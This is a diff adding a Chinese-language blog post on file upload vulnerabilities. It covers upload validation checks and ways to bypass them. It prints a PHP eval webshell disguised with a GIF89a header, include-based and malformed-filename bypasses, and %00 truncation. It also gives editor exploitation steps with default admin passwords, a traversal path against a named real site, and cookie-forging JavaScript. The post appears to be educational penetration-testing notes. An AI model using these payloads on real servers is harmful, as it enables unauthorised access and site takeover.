@@ -1,0 +1,698 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KaynZ" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      File Upload Vulnerabilities 
+      
+      
+      |
+    
+     L0ki&#39;s Website
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="L0ki's Website" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img no-lazy src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">L0ki</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/projects/">
+          <a href="/projects/">Projects</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.10/dist/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">File Upload Vulnerabilities</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2024-04-21 02:21:29
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="Tags"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Vulnerabilities/" title="Vulnerabilities">
+                    #Vulnerabilities
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>程序员由于没有对上传的文件进行严格限定，导致黑客可以通过工具上传其他格式的程序文件（比如：webshell），这样黑客就会拿到一个可执行环境，在服务器上搞破坏。</p>
+<h2 id="upload-labs思维导图"><a href="#upload-labs思维导图" class="headerlink" title="upload-labs思维导图"></a>upload-labs思维导图</h2><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/9113969-116edf0b414793b9.png" alt="mind-map.png"></p>
+<h2 id="请求包描述"><a href="#请求包描述" class="headerlink" title="请求包描述"></a>请求包描述</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/upload.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>274</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://localhost</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryuKS18BporicXJfTx</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,de;q=0.6,en;q=0.4,fr;q=0.2</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-routeros">------WebKitFormBoundaryuKS18BporicXJfTx</span></span><br><span class="line"><span class="language-routeros">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">&quot;file_x&quot;</span>; <span class="attribute">filename</span>=<span class="string">&quot;xx.php&quot;</span></span></span><br></pre></td></tr></table></figure>
+
+<p><strong>请求Header中Content-Type存在以下特征：</strong></p>
+<ul>
+<li>multipart&#x2F;form-data（表示该请求是一个文件上传请求）</li>
+<li>存在boundary字符串（作用为分隔符，以区分POST数据）</li>
+</ul>
+<p><strong>POST的内容存在以下特征：</strong></p>
+<ul>
+<li>Content-Disposition</li>
+<li>name</li>
+<li>filename</li>
+<li>POST中的boundary的值就是Content-Type的值在最前面加了两个–，除了最后标识结束的boundary</li>
+</ul>
+<h2 id="文件上传校验姿势"><a href="#文件上传校验姿势" class="headerlink" title="文件上传校验姿势"></a>文件上传校验姿势</h2><h3 id="三大校验简述"><a href="#三大校验简述" class="headerlink" title="三大校验简述"></a>三大校验简述</h3><p><strong>1、客户端javascript校验（一般只校验后缀名）</strong></p>
+<ul>
+<li>一般都是用javascript脚本检验上传文件的后缀</li>
+</ul>
+<p><strong>2、服务端校验</strong></p>
+<ul>
+<li>文件头content-type字段校验（image&#x2F;gif）</li>
+<li>文件内容头校验（GIF89a）</li>
+<li>后缀名黑名单校验</li>
+<li>后缀名白名单校验</li>
+<li>自定义正则校验</li>
+</ul>
+<p><strong>3、WAF设备校验（根据不同的WAF产品而定）</strong></p>
+<h3 id="服务端校验"><a href="#服务端校验" class="headerlink" title="服务端校验"></a>服务端校验</h3><hr>
+<h3 id="content-type字段校验"><a href="#content-type字段校验" class="headerlink" title="content-type字段校验"></a>content-type字段校验</h3><p>模拟web服务器端的校验代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] != <span class="string">&quot;image/gif&quot;</span>)  </span><br><span class="line"><span class="comment">#这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span></span><br><span class="line">&#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Sorry, we only allow uploading GIF images&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$uploaddir</span> = <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"><span class="variable">$uploadfile</span> = <span class="variable">$uploaddir</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;userfile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$uploadfile</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;File is valid, and was successfully uploaded.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;File uploading failed.\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p>
+<h3 id="文件头校验"><a href="#文件头校验" class="headerlink" title="文件头校验"></a>文件头校验</h3><p>主要是检测文件内容开始处的文件幻数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>） .JPEG;.JPE;.JPG，”JPGGraphic File”</span><br><span class="line">（<span class="number">2</span>） .gif，”GIF <span class="number">89</span>A”</span><br><span class="line">（<span class="number">3</span>） .zip，”Zip Compressed”</span><br><span class="line">（<span class="number">4</span>） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 <span class="keyword">or</span> Lotus Approach APRfile”</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件内容检测"><a href="#文件内容检测" class="headerlink" title="文件内容检测"></a>文件内容检测</h3><p>图像文件相关信息检测常用的就是<code>getimagesize()</code>函数，需要把文件头部分伪造好，就是在幻数的基础上还加了一些文件信息。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">GIF89a</span></span><br><span class="line">(...some <span class="keyword">binary</span> data <span class="keyword">for</span> image...)</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br><span class="line">(... skipping the rest of <span class="keyword">binary</span> data ...)</span><br></pre></td></tr></table></figure>
+
+<h3 id="文件加载检测"><a href="#文件加载检测" class="headerlink" title="文件加载检测"></a>文件加载检测</h3><p>一般是调用API函数去进行文件加载测试，常见的是图像渲染测试，再变态点的是进行二次渲染。<br>对渲染&#x2F;加载测试的攻击方式是代码注入绕过；对二次渲染的攻击方式是攻击文件加载器自身。</p>
+<p>二次渲染：相当于是把原本属于图像数据的部分抓了出来，再用自己的API或函数进行重新渲染，在这个过程中非图像数据的部分直接就被隔离开了。</p>
+<h2 id="文件上传绕过校验姿势"><a href="#文件上传绕过校验姿势" class="headerlink" title="文件上传绕过校验姿势"></a>文件上传绕过校验姿势</h2><h3 id="客户端绕过"><a href="#客户端绕过" class="headerlink" title="客户端绕过"></a>客户端绕过</h3><p>禁用JS，或者用Burp抓包改包。</p>
+<h3 id="服务端绕过"><a href="#服务端绕过" class="headerlink" title="服务端绕过"></a>服务端绕过</h3><hr>
+<h3 id="文件类型绕过"><a href="#文件类型绕过" class="headerlink" title="文件类型绕过"></a>文件类型绕过</h3><p>抓包改Content-type字段。</p>
+<h3 id="文件头绕过"><a href="#文件头绕过" class="headerlink" title="文件头绕过"></a>文件头绕过</h3><p>在木马内容基础上再加了一些文件信息</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;test&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="文件后缀名绕过"><a href="#文件后缀名绕过" class="headerlink" title="文件后缀名绕过"></a>文件后缀名绕过</h3><p><strong>前提：黑名单校验<br>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。</strong><br>绕过方法：</p>
+<ul>
+<li>找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类</li>
+<li>可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">能被解析的文件扩展名列表：</span><br><span class="line">jsp jspx jspf</span><br><span class="line">asp asa cer aspx</span><br><span class="line">php php php3 php4</span><br><span class="line">exe exee</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="配合文件包含漏洞"><a href="#配合文件包含漏洞" class="headerlink" title="配合文件包含漏洞"></a>配合文件包含漏洞</h2><p><strong>前提：校验规则只校验当文件后缀名为asp&#x2F;php&#x2F;jsp的文件内容是否为木马。</strong><br><strong>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）</strong></p>
+<ul>
+<li>先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；</li>
+<li>然后再上传一个.php的文件，内容为<br>这个php文件就会去引用txt文件的内容，从而绕过校验.</li>
+</ul>
+<p>下面列举包含的语法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#PHP    </span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">Include</span>(<span class="string">&quot;上传的txt文件路径&quot;</span>);<span class="meta">?&gt;</span> </span><br><span class="line"><span class="comment">#ASP    </span></span><br><span class="line">&lt;!--<span class="comment">#include file=&quot;上传的txt文件路径&quot; --&gt;</span></span><br><span class="line"><span class="comment">#JSP    </span></span><br><span class="line">&lt;jsp:inclde page=<span class="string">&quot;上传的txt文件路径&quot;</span>/&gt;</span><br><span class="line"><span class="keyword">or</span>  </span><br><span class="line">&lt;%@<span class="keyword">include</span> file=<span class="string">&quot;上传的txt文件路径&quot;</span>%&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="配合服务器解析漏洞"><a href="#配合服务器解析漏洞" class="headerlink" title="配合服务器解析漏洞"></a>配合服务器解析漏洞</h2><p>见<a target="_blank" rel="noopener" href="https://l0ki.top/archives/240/">文件解析漏洞</a></p>
+<h2 id="配合操作系统文件命令规则"><a href="#配合操作系统文件命令规则" class="headerlink" title="配合操作系统文件命令规则"></a>配合操作系统文件命令规则</h2><ul>
+<li>上传不符合windows文件命名规则的文件名</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">test.asp.</span><br><span class="line">test.<span class="title function_ invoke__">asp</span>(空格)</span><br><span class="line">test.php:<span class="number">1</span>.jpg</span><br><span class="line">test.php::<span class="variable">$DATA</span></span><br><span class="line">shell.php::<span class="variable">$DATA</span>…….</span><br></pre></td></tr></table></figure>
+
+<p>会被windows系统自动去掉不符合规则符号后面的内容。</p>
+<ul>
+<li>linux下后缀名大小写</li>
+</ul>
+<h2 id="CMS、编辑器漏洞"><a href="#CMS、编辑器漏洞" class="headerlink" title="CMS、编辑器漏洞"></a>CMS、编辑器漏洞</h2><h3 id="fckeditor"><a href="#fckeditor" class="headerlink" title="fckeditor"></a>fckeditor</h3><p>fckeditor编辑器页&#x2F;查看编辑器版本&#x2F;查看文件上传路径</p>
+<p>1，fckeditor编辑器页<br><code>FCKeditor/_samples/default.html</code><br>2, 查看编辑器版本<br><code>FCKeditor/_whatsnew.html</code><br>3, 查看文件上传路径<br><code>fckeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFile&amp;Type=image&amp;CurrentFolder=/</code></p>
+<p><code>FCKeditor</code>编辑器漏洞的利用：</p>
+<p>一般借助文件上传拿shell，像 &lt;2.4.x版本（也就是2.4.x及以下）</p>
+<p>的File参数时为黑名单验证，可以通过上</p>
+<p>传<code>.asa、.cer、.asp;jpg（针对IIS6，及文件解析漏洞）</code>。如果<code>asa、cer</code>不被解析，还可以传<code>.asp[空格]</code>。传的方法就是抓包然后</p>
+<p>在数据包里的文件名后填个空格；高版本的像2.6.3版本存在%00</p>
+<p>截断的，具体方法是:找到上传界面，上传图片马后，抓包修改，</p>
+<p>在post url请求头最后面加上<code>xxx.php（或asp ）%00 </code>上传成功后</p>
+<p>会自动将文件名截断，上传后的文件名就改成了<code>xxx.php（或asp）</code>。</p>
+<p>绕过<code>asp;.jpg</code>变<code>asp_jpg;</code></p>
+<p>有时服务器会把;.转义为_ ， 绕过的方法有很多，比如利用畸形文件名：&#96;&#96;a.aspx.a;a.aspx.jpg…jpg.aspx<br>xx.asp.;.jpg&#96;</p>
+<h3 id="ewededtior"><a href="#ewededtior" class="headerlink" title="ewededtior"></a>ewededtior</h3><p><code>ewededitor</code> 利用</p>
+<ul>
+<li><p>1,默认后台地址:<code>/ewebeditor/admin_login.asp</code></p>
+</li>
+<li><p>2,检测<code>admin_style.asp</code>文件是否可以直接访问</p>
+</li>
+<li><p>3,默认数据库路径：<code>[path]/db/ewebeditor.mdb</code></p>
+</li>
+<li><p>4,某些cms 是<code>[path]/db/db.mdb</code></p>
+</li>
+<li><p>5,使用默认密码:<code>admin/admin888 </code>或<code>admin/admin</code> 进入后台，也可以尝试 <code>admin/123456</code>（有些管理员以及一些cms就是这么设置的）</p>
+</li>
+</ul>
+<p>渗透的一般步骤：<br>找后台<br><code>admin_style.asp</code><br><code>admin/admin.asp</code><br>进后台<br>1，使用默认密码（使用一些弱口令）<br>2，下载<code>mdb</code>数据库（找到路径进入后下载）<br>3，burp 爆破<br>4，注入（找注入点用SQLmap跑）</p>
+<p>如果以上方法都失败了，还是有机会不进入后台拿shell的：</p>
+<p>利用<code>ewebeditor 5.2</code> 列目录漏洞<br><code>ewebeditor/asp/browser.asp</code><br>过滤不严，造成遍历目录漏洞，比如<br><code>http:// slkx.haue.edu.cn/ ewededitor/ asp/ browse.asp? style=standard650&amp;dir=…/…/…</code><br>利用<code>webeditor session</code>欺骗漏洞，进入后台。注意<code>…/</code>是返回上级目录的意思<br>拿到目录后找到数据库文件夹，能看到它的绝对路径访问下，下载下来就可以拿下这个网站了。<br>利用<code>ewebeditor PHP/ASP…</code>后台通杀漏洞（其实就是cookie欺骗）<br>影响版本：PHP&gt;&#x3D; 3.0-3.8与asp2.8版也通用<br>攻击利用：<br>进入后台<code>/ewebeditor/admin/login.php</code>，随便输入一个用户和密码，会提示出错了，这时你清空浏览器的<code>url</code>，然后输入</p>
+<p><code>Javascript:alert(document.cookie=&quot;adminuser=&quot;+escape(&quot;admin&quot;)); Javascript:alert(document.cookie=&quot;adminpass=&quot;+escape(&quot;admin&quot;)); JavaScript:alert(document.cookie=&quot;admindj=&quot;+escape(&quot;1&quot;));</code><br>而后三次回车，清空浏览器的<code>url</code>，就可以输入一些平常访问不到的文件比如：<code>…/ewebeditor/admin/default.php</code>，就会直接进去访问。</p>
+<h3 id="其他类型编辑器漏洞"><a href="#其他类型编辑器漏洞" class="headerlink" title="其他类型编辑器漏洞"></a>其他类型编辑器漏洞</h3><p><code>ckfinder</code>编辑器漏洞，<br>找到<code>ckfinder</code>目录下的<code>CKFinder.html</code>，上传点就在这里.<br>任意文件上传，然后利用IIS6.0文件解析漏洞，即可拿shell。<br><code>UEDITOR </code>编辑器漏洞<br>利用IIS6.0文件名解析漏洞，上传图片改名为<code>x.php;20190032342342.jpg </code>获取shell<br>PHPWEB网站管理系统后台<code>kedit</code>编辑器漏洞<br>两种利用方式<br>第一种是利用IIS6.0文件解析漏洞<br><code>xxx.php;xx.jpg</code><br>第二种方式<br>%00截断<br><code>xx.php%00jpg</code><br>等等<br>大部分编辑器漏洞都是配合文件解析漏洞拿shell</p>
+<h2 id="配合0x00截断"><a href="#配合0x00截断" class="headerlink" title="配合0x00截断"></a>配合0x00截断</h2><p>不做过多叙述</p>
+<h2 id="WAF-Bypass"><a href="#WAF-Bypass" class="headerlink" title="WAF Bypass"></a>WAF Bypass</h2><h3 id="WAF如何拦截"><a href="#WAF如何拦截" class="headerlink" title="WAF如何拦截"></a>WAF如何拦截</h3><ul>
+<li>解析文件名，判断是否在黑名单内。</li>
+<li>解析文件内容，判断是否为webshell。</li>
+<li>文件目录权限</li>
+</ul>
+<p><strong>目前，市面上常见的是解析文件名，少数WAF是解析文件内容，比如长亭。下面内容，都是基于文件名解析。</strong></p>
+<h3 id="垃圾数据"><a href="#垃圾数据" class="headerlink" title="垃圾数据"></a>垃圾数据</h3><p><strong>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。</strong></p>
+<ul>
+<li>构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+